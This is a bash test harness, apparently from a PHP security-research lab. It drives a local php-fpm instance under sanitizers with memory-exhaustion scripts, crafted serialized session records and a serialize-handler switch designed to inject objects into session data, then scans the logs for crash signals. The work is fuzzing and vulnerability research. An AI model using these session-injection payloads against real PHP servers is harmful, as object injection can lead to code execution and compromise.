#!/bin/bash
# php2shell rung 3 — FPM lane (owner DM #64).
#
# Drives a loopback-only php-fpm listener (127.0.0.1) with the committed
# rung-3 probe shapes: malloc-backed runtime/shutdown OOM on a persistent
# worker, rfc1867 upload-progress pre-RINIT decode of crafted session records,
# and the php_serialize -> php handler-switch unserialize-injection marker.
# FastCGI is spoken directly by lab/repro/php2shell-fpm-client.py (no nginx).
#
# Usage: bash lab/repro/php2shell-rung3-fpm.sh <php-fpm-bin> [outdir] [port]
#   <php-fpm-bin>: lab/build/php-<ver>-fpm-asan/sapi/fpm/php-fpm
# Every probe is labeled with the build in the log; verdict scan is at the end.

set -u
FPM=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
PORT=${PORT:-${3:-18123}}
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
mkdir -p "$OUT"
LOG="$OUT/rung3-fpm-$LABEL.log"
: > "$LOG"
D=$(mktemp -d)
MPID=
cleanup() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    if [ "${KEEP_TMP:-0}" = 1 ]; then echo "KEEP_TMP=$D" >&2; else rm -rf "$D"; fi
}
trap cleanup EXIT
SESS="$D/sess"; WWW="$D/www"; mkdir -p "$SESS" "$WWW"

# ---------------------------------------------------------------- worker PHP
printf '<?php echo "alive:" . getmypid() . "\\n";' > "$WWW/probe.php"
printf '<?php $a=[]; while(true){$a[]=str_repeat("x",1<<20);}' > "$WWW/oom.php"
printf '<?php register_shutdown_function(function(){$a=[];while(true){$a[]=str_repeat("x",1<<20);}});' > "$WWW/shutdown.php"
printf '<?php' > "$WWW/noop.php"
cat > "$WWW/wake.php" <<'EOF'
<?php
class W { function __wakeup() { echo "MARKER_W_WAKEUP\n"; } }
ini_set('session.serialize_handler', 'php');
session_start();
echo "wake:done:" . getmypid() . "\n";
EOF

# ---------------------------------------------------------------- FPM config
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
; ASAN_OPTIONS/UBSAN_OPTIONS are exported by the launching subshell below and
; inherited by workers (clear_env=no). FPM's INI parser rejects '=' inside an
; env[...] value and rejects '#' comments (both observed), so neither is used
; here.
php_admin_value[memory_limit] = 8M
php_admin_value[max_execution_time] = 0
php_admin_value[post_max_size] = 1G
php_admin_value[max_input_vars] = 10000000
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[session.save_path] = $SESS
php_admin_value[session.use_cookies] = 1
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
EOF
{ echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"

# ---------------------------------------------------------------- helpers
fcgi() { python3 "$CLIENT" "$PORT" "$@"; }
pid_of() { python3 -c 'import sys;print(sys.stdin.read().split("alive:")[-1].strip().split()[0])'; }
gen_mp() { # $1=upload-progress key bytes  $2=output file
python3 - "$1" "$2" <<'PY'
import sys
key, out = sys.argv[1], sys.argv[2]
b = '----fpmprobe'
s = lambda n, v: '--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (b, n, v)
body = (s('PHPSESSID', 'pocsid')
        + s('PHP_SESSION_UPLOAD_PROGRESS', key)
        + '--%s\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n'
          'Content-Type: text/plain\r\n\r\nhello\r\n' % b
        + '--%s--\r\n' % b)
open(out, 'wb').write(body.encode())
PY
}
wait_port() {
python3 - "$PORT" <<'PY'
import socket, sys, time
p = int(sys.argv[1])
for _ in range(100):
    try:
        s = socket.create_connection(('127.0.0.1', p), 0.2); s.close(); sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}

# ---------------------------------------------------------------- start FPM
( export USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1 \
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:allocator_may_return_null=1 \
    UBSAN_OPTIONS=halt_on_error=1
  exec "$FPM" -n -F -y "$D/fpm.conf" ) >> "$LOG" 2>&1 &
MPID=$!
if ! wait_port; then
    echo "FPM never opened 127.0.0.1:$PORT — see $LOG" >&2
    exit 1
fi
echo "== FPM master pid=$MPID label=$LABEL build=$BUILDDIR $(date -u)" >> "$LOG"

# ------------------------------------------------- A: OOM on a persistent child
base=$(fcgi "$WWW/probe.php"); cpid=$(printf '%s' "$base" | pid_of)
echo "-- baseline: $base  (child_pid=$cpid)" >> "$LOG"
for spec in oom shutdown; do
    resp=$(fcgi "$WWW/$spec.php")
    after=$(fcgi "$WWW/probe.php"); apid=$(printf '%s' "$after" | pid_of)
    echo "-- $spec: resp=$(printf '%s' "$resp" | tr '\n' '|' | cut -c1-220)" >> "$LOG"
    echo "   after: $after  (child_pid=$apid $([ "$apid" = "$cpid" ] && echo SAME || echo CHANGED))" >> "$LOG"
done

# ------------------------------------------- B: rfc1867 pre-RINIT crafted decode
mp="$D/body.txt"
probe_record() { # $1=label $2=record bytes (literal or @file)
    local label=$1 rec=$2
    if [ "${rec#@}" != "$rec" ]; then cp "${rec#@}" "$SESS/sess_pocsid"
    else printf '%s' "$rec" > "$SESS/sess_pocsid"; fi
    gen_mp 'key' "$mp"
    local before after rc
    before=$(cat "$SESS/sess_pocsid" 2>/dev/null)
    resp=$(fcgi "$WWW/noop.php" --body "$mp" \
        --param HTTP_COOKIE=PHPSESSID=pocsid \
        --param CONTENT_TYPE="multipart/form-data; boundary=----fpmprobe")
    rc=$?
    after=$(cat "$SESS/sess_pocsid" 2>/dev/null)
    echo "-- B/$label: rc=$rc before=[$before]" >> "$LOG"
    echo "   after=[$after]" >> "$LOG"
    printf '%s' "$resp" | grep -E 'Warning|Fatal|Notice|MARKER|Sanitizer|runtime error' >> "$LOG" 2>/dev/null || true
}
probe_record control            'x|O:8:"stdClass":1:{s:1:"a";i:1;}'
probe_record no_user_code       'w|O:1:"W":1:{s:1:"a";i:1;}u|a:1:{i:0;E:11:"Suit:Hearts";i:1;}m|O:7:"Missing":1:{s:1:"x";i:3;}'
probe_record missing_cls_name   'x|O:7:"Missing":1:{s:27:"__PHP_Incomplete_Class_Name";s:3:"foo";}'
probe_record missing_cls_ser    'x|O:7:"Missing":1:{s:33:"__PHP_Incomplete_Class_Serialized";s:15:"attacker bytes";}'
probe_record c_direct           'x|C:7:"Missing":15:{attacker bytes}'
probe_record c_ctrl             'x|C:7:"Missing":0:{}'
probe_record corrupt            'x|not-serialized-at-all'
printf 'x|O:8:"stdClass":1:{s:30:"\000A\000__PHP_Incomplete_Class_Name";s:3:"foo";}' > "$D/mangled.bin"
probe_record mangled            "@$D/mangled.bin"

# --------------------------------- C: php_serialize write -> runtime php decode
rm -f "$SESS"/sess_*
CRAFT='x|O:1:"W":1:{s:1:"a";i:1;}'
gen_mp "$CRAFT" "$mp"
resp1=$(fcgi "$WWW/noop.php" --body "$mp" \
    --param HTTP_COOKIE=PHPSESSID=pocsid \
    --param CONTENT_TYPE="multipart/form-data; boundary=----fpmprobe" \
    --param PHP_ADMIN_VALUE=session.serialize_handler=php_serialize)
echo "-- C/write php_serialize: rc=$? file=[$(cat "$SESS/sess_pocsid" 2>/dev/null)]" >> "$LOG"
printf '%s' "$resp1" | grep -E 'Warning|Fatal|Sanitizer' >> "$LOG" 2>/dev/null || true
# No multipart body here on purpose: including one re-runs the pre-RINIT
# rfc1867 handler, which rewrites sess_pocsid before wake.php's session_start
# and destroys the crafted record (observed on 8.4.26, marker hits 0).
resp2=$(fcgi "$WWW/wake.php" \
    --param HTTP_COOKIE=PHPSESSID=pocsid \
    --param PHP_ADMIN_VALUE=session.serialize_handler=php_serialize)
echo "-- C/decode runtime php: rc=$?" >> "$LOG"
printf '%s\n' "$resp2" >> "$LOG"


# C-control: a directly planted W record, php handler at REQUEST STARTUP
# (PS(mod) is chosen at RINIT, so an in-script ini_set is too late), with NO
# multipart rewrite. Validates that wake.php's __wakeup marker is observable
# in this SAPI; if it fires here but not in C/decode, the 0 there is a
# request-construction effect, not a broken marker.
printf 'x|O:1:"W":1:{s:1:"a";i:1;}' > "$SESS/sess_pocsid"
resp3=$(fcgi "$WWW/wake.php" --param HTTP_COOKIE=PHPSESSID=pocsid \
    --param PHP_ADMIN_VALUE=session.serialize_handler=php)
echo "-- C/control direct W record: rc=$?" >> "$LOG"
# record planted above: x|O:1:"W":1:{s:1:"a";i:1;}
printf '%s\n' "$resp3" >> "$LOG"

# ---------------------------------------------------------------- verdict
echo "== verdict scan (logs: $LOG + $D/fpm-error.log)" >> "$LOG"
if grep -hqE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY:|zend_mm_heap corrupted' \
        "$LOG" "$D/fpm-error.log"; then
    echo "   SANITIZER/ASSERT SIGNAL — rung 3 candidate, inspect" >> "$LOG"
else
    echo "   no ASan/UBSan/ZEND_ASSERT output: all FPM probes negative" >> "$LOG"
fi
grep -c 'MARKER_W_WAKEUP' "$LOG" | sed 's/^/   MARKER_W_WAKEUP hits: /' >> "$LOG"
if [ -f "$D/fpm-error.log" ]; then
    echo "--- fpm-error.log tail ---" >> "$LOG"
    cat "$D/fpm-error.log" >> "$LOG"
fi
echo "== verdict: $(grep -c 'SANITIZER/ASSERT' "$LOG") sanitizer signal(s)"
exit 0
